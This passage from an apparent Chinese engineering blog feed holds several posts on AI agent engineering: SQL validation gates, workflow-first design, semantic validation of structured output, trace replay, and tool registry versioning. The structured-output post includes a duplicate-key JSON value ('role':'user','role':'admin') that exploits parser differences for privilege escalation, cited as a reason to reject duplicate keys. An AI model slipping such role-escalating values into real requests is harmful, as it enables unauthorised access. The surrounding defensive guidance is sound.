<p>用户问题先结构化为 metric、dimensions、time range、grain、filters 和 qualifiers。SQL AST&#x2F;plan 反向映射这些要素，检查目标粒度、Join 基数、去重键、时间字段与默认过滤。缺关键口径就追问，不能由模型补成默认答案。</p>
<p>常用指标引用认证 definition ID&#x2F;version。生成 SQL 与认证表达式做结构化比较，或在固定快照与基准 SQL 对照。结果断言检查唯一性、非负、枚举、总分关系、空值和容差。</p>
<p>没有认证定义时也能执行探索查询，但答案标“临时分析”，返回 SQL、对象版本、数据时间和限制。模型总结不得把探索结果称为官方指标。</p>
<h2 id="四道闸门各自有失败语义"><a href="#四道闸门各自有失败语义" class="headerlink" title="四道闸门各自有失败语义"></a>四道闸门各自有失败语义</h2><p>响应不只给“验证失败”，而是：<code>SYNTAX_UNSUPPORTED</code>、<code>OBJECT_NOT_ALLOWED</code>、<code>PLAN_TOO_EXPENSIVE</code>、<code>METRIC_AMBIGUOUS</code> 等稳定代码。每个代码带可行动信息和 evidence ref，原始引擎错误只在运维审计中查看。</p>
<p>修复策略也不同。语法错可以在限制次数内让模型改写；权限失败立即停止，不提示如何绕过；资源过大让用户缩小范围或异步；语义歧义应追问。统一让模型“根据错误再试一次”，会把权限探测和资源消耗变成循环。</p>
<p>Run 状态记录每道闸门 input&#x2F;version&#x2F;outcome。自动重写后从第一道重新开始，不能只重跑失败那层，因为 AST 和对象集合可能改变。</p>
<p>监控分别统计四层拒绝率与误放案例。SQL 最终被人工纠正时，标注是哪道闸门应发现却没发现，进入对应回归集。</p>
<h2 id="写操作不能靠多加一个确认框"><a href="#写操作不能靠多加一个确认框" class="headerlink" title="写操作不能靠多加一个确认框"></a>写操作不能靠多加一个确认框</h2><p>四道闸门为只读查询建立底座，不自动授权 INSERT、UPDATE、DROP。写操作还需要 change plan、影响范围、审批、幂等、版本检查、事务&#x2F;补偿和回滚证据。</p>
<p>即使用户确认，也要按目标对象当前版本再鉴权。确认只证明用户看过计划，不证明计划安全。生产变更更适合让模型生成草案，由已有发布系统执行，而不是让 SQL Agent 直接持有管理员连接。</p>
<p>AI SQL 的工程边界不是把模型包在数据库外面就完成。语句、数据、资源、语义四道闸门各自独立，才能说明一条 SQL 为何被允许，也能在错的时候知道该修哪一层。</p>
<h2 id="对照官方资料"><a href="#对照官方资料" class="headerlink" title="对照官方资料"></a>对照官方资料</h2><ul>
<li><a href="https://www.postgresql.org/docs/15/sql-explain.html">PostgreSQL 15 <code>EXPLAIN</code>：计划与 ANALYZE 的执行语义</a></li>
<li><a href="https://www.postgresql.org/docs/15/sql-grant.html">PostgreSQL 15 <code>GRANT</code>：对象与列权限</a></li>
<li><a href="https://github.com/apache/spark/blob/fbbcf9434ac070dd4ced4fb9efe32899c6db12a9/docs/sql-ref-syntax-qry-explain.md">Apache Spark 3.3.1 SQL <code>EXPLAIN</code>：逻辑与物理计划</a></li>
<li><a href="https://github.com/apache/flink/blob/c41c8e5cfab683da8135d6c822693ef851d6e2b7/docs/content/docs/dev/table/sql/explain.md">Apache Flink 1.15.3 SQL <code>EXPLAIN</code>：执行计划与细节</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>数据平台</tag>
        <tag>AI SQL</tag>
        <tag>SQL 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>企业 Agent 先做 Workflow：自由度应该放在真正需要判断的地方</title>
    <url>//2024/06/07/workflow-before-autonomous-agent/</url>
    <content><![CDATA[<p>企业里讨论 Agent，常从“让模型自己规划并完成任务”开始。实际落地时，很多目标早已有明确步骤：查元数据、生成 SQL、跑验证、等待确认、发布结果。把这些步骤全部交给模型动态决定，会增加成本和不确定性，却没有增加业务价值。</p>
<p>我的默认选择是先做 Workflow。运行时控制阶段与状态，模型只出现在需要语言理解或候选判断的节点。只有任务路径确实无法预先枚举、并且工具与权限边界已经成熟，才开放有限 Agent loop。</p>
<p class="article-diagram-scroll"><img src="/images/articles/workflow-before-autonomous-agent.svg" class="lazyload" data-srcset="/images/articles/workflow-before-autonomous-agent.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="先把确定性骨架搭好，再开放 Agent 决策"></p>
<span id="more"></span>

<h2 id="先判断路径是否真的未知"><a href="#先判断路径是否真的未知" class="headerlink" title="先判断路径是否真的未知"></a>先判断路径是否真的未知</h2><p>“分析失败任务并给出修复建议”听起来像开放任务，拆开后通常有固定骨架：获取实例与日志、分类错误、读取作业配置&#x2F;代码、收集引擎指标、形成假设、执行只读验证、输出证据。变化的是选哪些证据和如何解释，不是每一步都未知。</p>
<p>固定骨架适合 Workflow：阶段、输入输出 schema、超时、重试、权限和终态都能提前定义。模型在“错误分类”“候选证据选择”“建议生成”节点发挥作用，数据获取和执行由确定性工具完成。</p>
<p>真正适合 Agent loop 的是探索空间无法列全的子任务，例如在大型代码库中根据中间发现选择下一处源码，或研究多个可能来源。即便如此，loop 也受工具 allowlist、步数、成本、deadline 和检查点限制。</p>
<p>ReAct 把 reasoning 与 actions 交错，让模型能根据环境反馈继续行动。这种模式解释了开放式工具使用的价值，也提醒我们每个 action 都会改变后续轨迹。生产系统需要在外层提供状态和边界，不能只保存最终答案。</p>
<h2 id="Workflow-把失败位置变得清楚"><a href="#Workflow-把失败位置变得清楚" class="headerlink" title="Workflow 把失败位置变得清楚"></a>Workflow 把失败位置变得清楚</h2><p>一个自由 Agent 跑了十步后失败，可能是计划错、检索错、工具错、结果解析错或上下文累积错。固定 Workflow 每个节点有输入、输出和状态，失败可以定位到具体阶段并从 checkpoint 恢复。</p>
<p>节点状态不只 success&#x2F;failed。工具异步执行会有 accepted&#x2F;running，用户确认有 waiting&#x2F;expired&#x2F;rejected，模型流可能 incomplete，验证可能 needs_review。工作流引擎持久化这些状态，不靠对话文本推断。</p>
<p>重试按节点语义配置。纯检索可安全重试，创建工单需要 idempotency key，模型生成可以建立新 attempt，人工拒绝不能自动重试。把整个流程从头重跑，会重复已完成副作用。</p>
<p>补偿也是显式节点。发布配置后下游验证失败，回滚使用原版本与 operation ID；不是让模型阅读错误后临时想一个撤销命令。不可补偿动作放在最后，并要求更强确认。</p>
<h2 id="有限决策点要输出结构化理由"><a href="#有限决策点要输出结构化理由" class="headerlink" title="有限决策点要输出结构化理由"></a>有限决策点要输出结构化理由</h2><p>模型节点不只返回选择，还返回候选、confidence、evidence refs 和 unresolved conditions。例如错误分类输出 <code>category=SCHEMA_MISMATCH</code>，同时引用日志行与 Catalog diff。confidence 低时 Workflow 走人工或补充证据分支。</p>
<p>分支集合由程序定义。模型可以在 <code>retry / inspect_schema / inspect_resources / escalate</code> 中选，不允许自己发明 <code>restart_cluster</code>。新增动作先注册工具、策略和测试，再进入选择集合。</p>
<p>决策理由用于审计和评测，但执行器不解析自然语言理由决定权限。真正的 branch value 是枚举，schema 与业务规则验证后才推进。</p>
<p>模型返回无效结构时，有限次数做格式修复；仍失败走明确 fallback。不能把同一 Prompt 无限重试直到偶然成功，成本和延迟都会失控。</p>
<h2 id="检查点把“看起来完成”变成可验证完成"><a href="#检查点把“看起来完成”变成可验证完成" class="headerlink" title="检查点把“看起来完成”变成可验证完成"></a>检查点把“看起来完成”变成可验证完成</h2><p>每个关键阶段定义 completion evidence。SQL 生成完成需要 parser&#x2F;catalog&#x2F;plan 通过；工具操作完成需要 operation status 与回读；RAG 答案完成需要核心 claims 有 evidence；文件修改完成需要 diff 与测试。</p>
<p>检查点优先用机器断言。行数、状态、schema、hash、退出码都能确定验证；业务口径或高风险影响再让人确认。所有事情都人工确认，Workflow 只是把工单换成聊天；所有事情都让模型判断，又回到不可靠自动化。</p>
<p>人工确认绑定 plan hash 与资源 version。等待期间 Workflow 持久化，不占模型连接；确认到达后从 checkpoint 恢复。超时进入 expired，不继续使用旧授权。</p>
<p>输出页面展示步骤状态和证据，让用户知道系统在哪一步、为什么停。只显示模型“正在思考”，既不能诊断，也无法建立合理等待预期。</p>
<h2 id="从-Workflow-演进到-Agent-要有数据"><a href="#从-Workflow-演进到-Agent-要有数据" class="headerlink" title="从 Workflow 演进到 Agent 要有数据"></a>从 Workflow 演进到 Agent 要有数据</h2><p>先上线 Workflow 会积累真实轨迹：哪些节点经常需要新增分支，人工在哪些地方改选项，固定流程在哪些任务上绕路。只有这些证据能说明某段需要更多自主规划。</p>
<p>开放一个 Agent 子循环时，比较完成率、工具错误、人工接管、步数、成本和高风险失败。成功率提高但调用次数翻十倍，或偶尔越过对象边界，不值得换自由度。</p>
<p>Agent 输出仍回到 Workflow checkpoint。它可以探索并提交计划，执行生产动作仍走工具策略与确认。这样开放决策不会自动扩大执行权。</p>
<p>无法解释的长尾任务可以明确转人工，不必为了“全自动”让 Agent 猜到底。自动化覆盖率是结果，不是唯一目标；可靠地知道自己不能完成，同样是系统能力。</p>
<h2 id="运行版本必须冻结"><a href="#运行版本必须冻结" class="headerlink" title="运行版本必须冻结"></a>运行版本必须冻结</h2><p>一次 Workflow run 固定 workflow definition、Prompt Bundle、tool registry、policy 和 model snapshot。运行一半发布新定义，不影响已经启动的实例；迁移必须显式并验证当前 checkpoint 兼容。</p>
<p>事件日志保存 node attempts、输入输出 artifact refs、决策、工具 operation 和最终状态。失败可以从 checkpoint fork 一次回放，不修改原历史。评测从真实轨迹中抽取，而不是只看最终文本。</p>
<p>企业 Agent 不需要一开始就证明模型能自己做完所有事。先把流程中确定的部分固化，把自由度放在真正需要判断的节点，再用工具、检查点和状态机守住边界，系统会更快进入可用状态，也更容易持续扩大能力。</p>
<h2 id="参考论文与资料"><a href="#参考论文与资料" class="headerlink" title="参考论文与资料"></a>参考论文与资料</h2><ul>
<li><a href="https://arxiv.org/abs/2210.03629">ReAct：交错 Reasoning 与 Acting 的语言模型方法</a></li>
<li><a href="https://arxiv.org/abs/2305.04091">Plan-and-Solve Prompting：先规划再执行的推理方法</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：用结构化函数参数连接外部工具</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/utils/state.py#L25-L71">Apache Airflow 2.4.1 TaskInstance 状态模型</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent Workflow</tag>
        <tag>工程架构</tag>
        <tag>可靠性</tag>
      </tags>
  </entry>
  <entry>
    <title>模型输出符合 JSON Schema，为什么仍然不能直接执行</title>
    <url>//2024/07/20/structured-output-semantic-validation/</url>
    <content><![CDATA[<p>模型能稳定返回 JSON 后，很多 Agent 链路会直接反序列化并调用后端。JSON Schema 确实能挡住缺字段、类型错和非法枚举，但它无法证明 <code>job_id</code> 指向用户想要的任务，也无法证明开始时间早于结束时间、资源仍处于可操作状态。</p>
<p>我把结构化输出看成候选命令。它要经过解析、schema、归一化、业务语义和执行前绑定五层，最后才成为工具可接受的 command。结构正确只是第二层，不是执行许可。</p>
<p class="article-diagram-scroll"><img src="/images/articles/structured-output-semantic-validation.svg" class="lazyload" data-srcset="/images/articles/structured-output-semantic-validation.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="结构正确之后还要做语义归一与状态校验"></p>
<span id="more"></span>

<h2 id="第一层先保证拿到完整-JSON"><a href="#第一层先保证拿到完整-JSON" class="headerlink" title="第一层先保证拿到完整 JSON"></a>第一层先保证拿到完整 JSON</h2><p>流式响应里 arguments 可能分多帧到达，连接 EOF 前不能解析；非流式也可能被长度限制截断。先检查模型 finish 状态、内容字节上限、UTF-8、JSON 完整性、嵌套深度和重复 key 策略。</p>
<p>不同 JSON parser 对重复 key 可能取第一或最后一个。<code>{&quot;role&quot;:&quot;user&quot;,&quot;role&quot;:&quot;admin&quot;}</code> 若各层处理不同，会形成安全差异。我倾向直接拒绝重复 key，并使用同一 canonical parser 生成后续 hash。</p>
<p>数值也要限制。JSON 允许的数在具体语言里可能溢出或丢精度；时间、金额和 ID 不用浮点自由表示。大数组和深层对象在 schema 前就设资源上限，防止解析器消耗过大。</p>
<p>解析失败可以让模型有限修复一次，但原输出与 repair attempt 都保存。不能把半个 JSON 猜补完整后继续执行，尤其涉及副作用时。</p>
<h2 id="Schema-只验证结构契约"><a href="#Schema-只验证结构契约" class="headerlink" title="Schema 只验证结构契约"></a>Schema 只验证结构契约</h2><p>JSON Schema 适合声明 type、required、enum、pattern、min&#x2F;max、array size 和 <code>additionalProperties: false</code>。工具版本固定 schema hash，调用与审计知道当时按哪份契约验证。</p>
<p>未知字段默认拒绝，不静默丢弃。模型生成 <code>force=true</code> 而旧客户端忽略，可能让人误以为生效；未来服务端新增同名字段时，历史输出又改变含义。</p>
<p>格式关键字也有边界。<code>format: date-time</code> 能检查字符串形状，不决定业务时区、是否允许未来时间、是否处于变更窗口。pattern 匹配 resource ID，也不证明对象存在或属于当前租户。</p>
<p>schema 版本与工具实现保持兼容窗口。新增 optional 字段可以兼容，修改枚举含义或 required 字段要发布新版本。Agent Run 固定工具 schema，不在中途切换。</p>
<h2 id="归一化必须在授权之前固定"><a href="#归一化必须在授权之前固定" class="headerlink" title="归一化必须在授权之前固定"></a>归一化必须在授权之前固定</h2><p>模型可能输出“明天”“8 点”“10GB”“订单同步任务”。执行策略需要确定值：RFC 3339 时间、字节数、稳定 resource ID。归一化产生 canonical arguments，后续权限、确认和幂等都绑定它。</p>
<p>相对时间用用户时区和 Run 创建时间解析，结果同时保留原表达。夏令时歧义、缺时区或跨日范围不能默认猜。容量单位明确 GB 是十进制还是 GiB 二进制，金额带币种。</p>
<p>对象名称通过 resolve 工具得到候选 ID。多个同名对象时暂停确认，不选最高相似度。展示名可以变，command 只携带 ID + expected version。</p>
<p>字符串规范化要谨慎。自动 trim 对普通描述无碍，对密码、代码、路径或签名可能改变含义。每个字段声明 normalization policy，不能全局套一套清洗。</p>
<h2 id="业务语义覆盖跨字段与当前状态"><a href="#业务语义覆盖跨字段与当前状态" class="headerlink" title="业务语义覆盖跨字段与当前状态"></a>业务语义覆盖跨字段与当前状态</h2><p><code>start_at</code> 和 <code>end_at</code> 单独都合法，组合可能 end 在 start 前；补数范围合法，但超过 31 天配额；<code>target_state=STOPPED</code> 合法，但任务已经 SUCCESS。它们需要读取业务规则和实时状态。</p>
<p>验证输入是 subject、canonical arguments、resource snapshot 和 policy version。输出不只 true&#x2F;false，还包含 reason code、obligations、expected resource version 和 evidence refs。</p>
<p>跨对象约束也在这里。把作业移动到另一个项目，需要源&#x2F;目标项目权限、类型兼容和依赖影响。schema 很难表达图关系和动态配额，硬塞进 description 让模型遵守更不可靠。</p>
<p>语义失败不总能自动修复。对象歧义需问用户，权限拒绝直接停止，状态冲突可刷新后重新预览，参数业务不合法可给允许范围。错误类型决定 recovery，不让模型对所有失败自由猜下一步。</p>
<h2 id="执行前绑定防止确认后换参"><a href="#执行前绑定防止确认后换参" class="headerlink" title="执行前绑定防止确认后换参"></a>执行前绑定防止确认后换参</h2><p>高风险命令把 canonical arguments、subject、resource ID&#x2F;version、tool&#x2F;schema version 和 expiry 计算 plan hash。用户确认或审批 token 绑定这个 hash。</p>
<p>执行服务重新读取资源，compare expected version，再做一次权限与语义检查。确认到执行之间状态变化，就返回冲突并要求新 plan。不能因为用户已经点过确认就跳过当前状态。</p>
<p>幂等键也绑定 canonical hash。同一 call ID 但参数不同直接冲突；相同参数重复请求返回之前 operation。timeout 后先查 operation status，避免重复副作用。</p>
<p>最终命令只包含工具实现需要的字段，模型原文作为审计引用，不传给底层。执行结果按 result schema 和业务状态回读验证，HTTP 200 不直接等于成功。</p>
<h2 id="测试要覆盖“合法但错误”"><a href="#测试要覆盖“合法但错误”" class="headerlink" title="测试要覆盖“合法但错误”"></a>测试要覆盖“合法但错误”</h2><p>常规 schema 测试只覆盖 missing、wrong type、bad enum。更重要的用例是每个字段都合法但组合错误：跨租户 ID、过期 version、日期倒置、超范围、确认后修改、对象刚被删除、同名歧义。</p>
<p>Property-based testing 可以生成边界值与字段组合，断言验证器不会崩溃、不会绕过策略。生产失败去敏后进入回归，按 parse&#x2F;schema&#x2F;normalize&#x2F;semantic&#x2F;bind 分桶。</p>
<p>监控也按层统计。schema invalid 高可能是工具描述差，semantic conflict 高可能是对象状态变化快，resolve ambiguous 高说明命名治理不足。所有失败叫“模型 JSON 错了”，会让 Prompt 越写越长却修不到根因。</p>
<p>结构化输出的意义，是把自然语言建议变成可验证数据，不是把模型直接变成 RPC 客户端。JSON Schema 建好形状边界后，还要把单位、身份、权限、状态和确认交给确定性代码，才有资格执行。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-core">JSON Schema 2020-12 Core：schema 与实例的核心模型</a></li>
<li><a href="https://json-schema.org/draft/2020-12/json-schema-validation">JSON Schema 2020-12 Validation：类型、required、enum、数值与数组约束</a></li>
<li><a href="https://www.rfc-editor.org/rfc/rfc8259">RFC 8259：JSON 数据交换格式与对象&#x2F;数值语义</a></li>
<li><a href="https://openai.com/index/function-calling-and-other-api-updates/">OpenAI 2023 Function Calling：按 JSON Schema 描述函数参数</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>结构化输出</tag>
        <tag>JSON Schema</tag>
        <tag>语义验证</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent Trace 怎么回放：复现决策，不重复生产副作用</title>
    <url>//2024/09/04/agent-trace-replay/</url>
    <content><![CDATA[<p>Agent 出问题后，常见做法是把用户问题再问一次。第二次可能用了新模型、新索引和变化后的工具状态，即使答对，也不能证明原问题修复；如果工具有副作用，直接重跑还可能再次发送、创建或修改。</p>
<p>我把 Trace Replay 分成三层：先用原始事件回放协议转换和状态归并，再用固定检索&#x2F;工具 fixture 回放编排，最后才在隔离环境调用新模型或新索引。每层回答不同问题，且生产副作用默认不重演。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-trace-replay.svg" class="lazyload" data-srcset="/images/articles/agent-trace-replay.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Trace 的三层回放"></p>
<span id="more"></span>

<h2 id="Replay-Manifest-先冻结现场"><a href="#Replay-Manifest-先冻结现场" class="headerlink" title="Replay Manifest 先冻结现场"></a>Replay Manifest 先冻结现场</h2><p>一次可回放 Run 不只需要 messages。manifest 至少引用 Bundle、model snapshot、route policy、tool registry&#x2F;schema、index&#x2F;knowledge snapshot、policy version、用户权限测试身份、原生流事件和工具 artifacts。</p>
<p>artifact 使用内容 hash 和不可变地址。数据库“当前状态”会变化，回放应保存当时读取的对象 snapshot 或 mock response；只记一个 object ID，几天后拿到的是另一个 version。</p>
<p>敏感 payload 加密并受访问审批，常规回放使用脱敏 fixture。manifest 可验证各 artifact hash，避免有人修改测试输入后仍声称在复现同一次故障。</p>
<p>预期不一定是完整答案文本。更稳定的是不变量：不得重复调用工具、最终状态应 incomplete、必须引用某 source、对象 ID 应为 X、越权请求必须拒绝。文本有随机性，业务与安全边界必须确定。</p>
<h2 id="L1-纯协议回放定位适配器问题"><a href="#L1-纯协议回放定位适配器问题" class="headerlink" title="L1 纯协议回放定位适配器问题"></a>L1 纯协议回放定位适配器问题</h2><p>第一层不调用模型和工具。把线上保存的 provider raw response&#x2F;body&#x2F;SSE bytes 重新送入 adapter、event reducer 和 finalizer，比较旧版与修复版输出。</p>
<p>它适合验证中文 UTF-8 跨 chunk、多个 SSE event 同 chunk、function arguments 分片、未知 finish reason、200 后断流、usage 晚到等问题。对原始字节随机重新分片，归并结果必须相同。</p>
<p>L1 应该快速、确定，可在 CI 全量跑。若修复“缺最后一段文本”，同一 raw events 在新版应得到完整结果，同时其他 fixtures 不改变终态。无需再次付模型费用，也不受模型输出变化影响。</p>
<p>只保存最终文本就做不了这层。可观测设计必须保留足够的原生事件结构和序列，哪怕正文因合规只保存加密 payload。</p>
<h2 id="L2-组件回放定位编排与状态"><a href="#L2-组件回放定位编排与状态" class="headerlink" title="L2 组件回放定位编排与状态"></a>L2 组件回放定位编排与状态</h2><p>第二层运行真实 Agent orchestrator，但 retrieval、model 和 tools 使用固定 fixtures。输入相同，外部响应按 manifest 返回，可测试分支、重试、权限、状态机和最终化。</p>
<p>工具 fixture 不只返回 success。超时但已有 operation ID、200-malformed、STATE_CONFLICT、迟到回调、需要确认都要保留真实形态。模型 fixture 可按 attempt 返回指定事件序列，验证 fallback 是否重复执行已成功工具。</p>
<p>虚拟时钟控制 timeout、backoff、approval expiry 和 deadline。测试不真的等 30 分钟，也不依赖机器时间。随机 ID 使用可注入生成器，方便断言事件关系。</p>
<p>组件回放结束输出完整 state&#x2F;event log，与预期 transition invariants 比较。只断言最终 status，可能漏掉中间重复操作后来被覆盖。</p>
<h2 id="L3-在线重演验证新模型与新知识"><a href="#L3-在线重演验证新模型与新知识" class="headerlink" title="L3 在线重演验证新模型与新知识"></a>L3 在线重演验证新模型与新知识</h2><p>要验证 Prompt&#x2F;model&#x2F;index 改动时，才进入第三层。真实调用创建新的 replay run&#x2F;attempt，关联原 Run，但不修改原历史。固定其余变量，一次只换目标组件。</p>
<p>副作用工具替换为 dry-run&#x2F;sandbox，或只查询原 operation 状态。创建、发送、删除类工具绝不因为“回放”直接调用生产。若必须验证真实集成，使用专用测试资源和可清理 namespace，并经过明确审批。</p>
<p>外部数据无法冻结时，报告标出 drift。比如索引已更新，只能比较新知识下的行为，不声称复现当时 retrieval；模型供应商无法调用旧 snapshot，也要标 model changed。</p>
<p>在线重演重复多次，比较通过率、tool path、tokens、latency 与成本分布。一次成功只能证明有可能答对，不证明退化消失。</p>
<h2 id="差异报告要沿事件对齐"><a href="#差异报告要沿事件对齐" class="headerlink" title="差异报告要沿事件对齐"></a>差异报告要沿事件对齐</h2><p>旧、新 Run 按逻辑节点对齐：context built、model attempt、tool proposal、policy decision、operation result、final claims。仅做最终文本 diff，会把关键的工具路径变化藏掉。</p>
<p>事件 diff 展示新增&#x2F;删除&#x2F;改变的工具调用、参数 hash、对象、状态、引用和 finish reason。自然语言使用事实 claim diff，而不是逐字符 diff。成本与延迟按 span 比较。</p>
<p>找不到对应节点时也有意义。新版少了一次无用检索是优化；少了权限检查是严重回归。节点有类型与风险标签，报告按风险排序。</p>
<p>修复验证要求原失败不变量通过、邻近用例不退化、守门集通过。只有 replay case 通过可能是对单个输入过拟合。</p>
<h2 id="回放系统本身需要隔离"><a href="#回放系统本身需要隔离" class="headerlink" title="回放系统本身需要隔离"></a>回放系统本身需要隔离</h2><p>生产 trace 中的凭据、审批 token 和 signed URLs 在采集时就不应保存，回放用专用身份重新授权。原 token 即使未过期也禁止使用。</p>
<p>网络默认 deny，只允许声明的 mock 或 sandbox endpoint。回放任务有 CPU&#x2F;token&#x2F;cost 配额，防一个故障 trace 进入无限 Agent loop。输出标 <code>replay=true</code>，不写回生产会话、memory 或业务数据库。</p>
<p>回放人员的权限与原用户权限分开。为了复现某用户看到的过滤结果，使用合成 policy snapshot，不给调试者直接扩大生产访问。所有 artifact 解密和在线重演都进入审计。</p>
<p>Agent Trace Replay 的核心不是“再跑一遍”，而是按问题选择最小重放层。协议 bug 用原事件确定重放，编排 bug 用 fixtures，模型行为再做受控在线实验。这样既能复现决定，又不会把调查变成第二次生产操作。</p>
<h2 id="对照规范与资料"><a href="#对照规范与资料" class="headerlink" title="对照规范与资料"></a>对照规范与资料</h2><ul>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：Span、Event、Link 与状态</a></li>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨服务关联 Trace</a></li>
<li><a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">Git Objects：用内容寻址保存不可变 artifact</a></li>
<li><a href="https://github.com/openai/evals">OpenAI Evals：基于固定样本与 grader 的回归</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Trace Replay</tag>
        <tag>Agent 可观测性</tag>
        <tag>回归验证</tag>
      </tags>
  </entry>
  <entry>
    <title>工具注册表不只是函数清单：能力、风险和兼容性都要版本化</title>
    <url>//2024/10/13/tool-registry-capability-version/</url>
    <content><![CDATA[<p>Agent 工具多起来后，最初那份 <code>name + description + parameters</code> 列表很快不够用。平台不知道哪个工具有副作用、能否自动重试、需要什么权限、错误如何分类，也不知道 schema 改动会影响哪些 Prompt 和运行中的 Agent。</p>
<p>我把工具注册表做成 Capability Registry。注册项不仅供模型选择，也供路由、策略、执行器、审计和发布系统使用。每个版本不可变，Agent Bundle 固定 registry snapshot，运行中不会看到工具定义漂移。</p>
<p class="article-diagram-scroll"><img src="/images/articles/tool-registry-capability-version.svg" class="lazyload" data-srcset="/images/articles/tool-registry-capability-version.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="工具注册表发布的是可验证能力版本"></p>
<span id="more"></span>

<h2 id="Manifest-先描述执行语义"><a href="#Manifest-先描述执行语义" class="headerlink" title="Manifest 先描述执行语义"></a>Manifest 先描述执行语义</h2><p>一个工具版本至少包含 input&#x2F;output&#x2F;error schema、owner、risk level、required permissions、side effect、idempotency、timeout、retry policy、confirmation、data classification 和 endpoint binding。</p>
<p><code>read_only=true</code> 不能只写在 description。执行器根据结构字段决定能否重试、是否允许影子调用；策略根据 action&#x2F;resource type 做授权；UI 根据 confirmation schema 渲染计划。</p>
<p>错误 schema 列出稳定 code、retryable 与 recovery actions。底层 Java&#x2F;HTTP 异常由 adapter 映射，不把任意 message 交给模型决定下一步。未知错误默认不可重试并保留 native ref。</p>
<p>结果 schema 同样重要。HTTP 200 但缺 operation ID，或字段类型变化，应判协议失败。模型只看到验证后的有限结果，原始 body 留在受控审计。</p>
<h2 id="版本由内容和兼容性决定"><a href="#版本由内容和兼容性决定" class="headerlink" title="版本由内容和兼容性决定"></a>版本由内容和兼容性决定</h2><p>工具 ID 稳定，例如 <code>jobs.rerun</code>；版本 <code>v3</code> 指向不可变 manifest 与实现契约，schema 有独立 hash。修改 description 也可能改变模型选择行为，因此仍发布新 registry version，即使后端 API 未变。</p>
<p>兼容性分三类。新增 optional 输出字段通常向后兼容；新增 required 输入、收紧枚举或改变错误含义不兼容；修改 description&#x2F;风险提示属于行为兼容性，需要评测而不是只看 JSON Schema。</p>
<p>语义版本号可以表达承诺，但真正判定依赖 diff 规则与 owner 审核。自动检查 required、type、enum、additionalProperties 和 error codes；行为变化由变更说明列出假设和回归桶。</p>
<p>一次 Run 固定 exact tool versions。使用 <code>latest</code> 只发生在 Bundle 构建&#x2F;发布阶段，不能每轮从 registry 动态解析。否则用户确认 v2 计划，执行时工具已变 v3，plan hash 失去意义。</p>
<h2 id="注册前必须通过契约测试"><a href="#注册前必须通过契约测试" class="headerlink" title="注册前必须通过契约测试"></a>注册前必须通过契约测试</h2><p>Provider&#x2F;工具 owner 提供 sandbox 或 mock fixtures。Registry CI 验证 schema、鉴权、timeout、取消、幂等、重复调用、部分成功、错误映射和敏感字段脱敏。</p>
<p>happy path 只占一小部分。创建类工具要测试客户端 timeout 后查询 operation、相同 idempotency key 不重复创建、不同参数冲突；查询类测试权限过滤和结果上限；异步工具测试 accepted 不被当 completed。</p>
<p>模型选择评测使用真实名称和 description，验证该调用时选中、不该调用时不选、歧义时追问。工具 schema 本身合法，并不保证描述让模型正确理解。</p>
<p>通过后产出签名 manifest&#x2F;hash。Registry 不允许运行时服务自己覆盖 schema；实现部署与 registry binding 有显式 rollout，二者版本不匹配时停止接流。</p>
<h2 id="Alias-发布与回滚要原子"><a href="#Alias-发布与回滚要原子" class="headerlink" title="Alias 发布与回滚要原子"></a>Alias 发布与回滚要原子</h2><p>业务使用 <code>prod:jobs.rerun</code> alias 指向一个已验证版本。新版本先离线&#x2F;影子，再灰度特定 Agent Bundles，最后切 alias。旧版本保留兼容窗口，运行中的 Run 继续使用。</p>
<p>回滚 alias 不代表回滚已产生的动作。执行审计记录实际 tool version、endpoint build 和 operation ID；若 v3 产生错误变更，需走业务补偿。Registry 只恢复后续调用。</p>
<p>健康路由也不能改变契约。主 endpoint 不健康切备 endpoint 时，备实现必须通过同版本 contract tests；不能把调用转到参数相似但语义不同的旧 API。</p>
<p>alias 变更、审批、灰度范围和观测指标进入发布记录。绕过 registry 直接让 Agent 调内部 URL，失去所有版本与策略保证，应在网络&#x2F;身份层禁止。</p>
<h2 id="弃用先看使用图"><a href="#弃用先看使用图" class="headerlink" title="弃用先看使用图"></a>弃用先看使用图</h2><p>下线工具版本前，Registry 从 Run traces 与 Bundle manifests 构建使用图：哪些线上 Agent、Prompt examples、评测用例和未完成 Runs 仍引用。不能仅凭“一个月没有新调用”删除，因为长流程可能仍在等待确认。</p>
<p>deprecation 包含 announce、no-new-binding、sunset、disabled 四阶段。构建新 Bundle 时禁止绑定 deprecated 版本，旧 Bundle 在兼容期继续；到 sunset 前完成迁移与回归。</p>
<p>替代工具提供 migration mapping，但不让 runtime 自动把老参数猜成新参数。不兼容迁移在 Bundle 构建时显式完成，生成新的 tests 和 plan hash。</p>
<p>紧急禁用用于安全事故，可立即让策略拒绝新执行；运行中的 operation 根据风险选择取消、冻结或继续。状态与用户提示明确，不能表现成模型突然“不会调用”。</p>
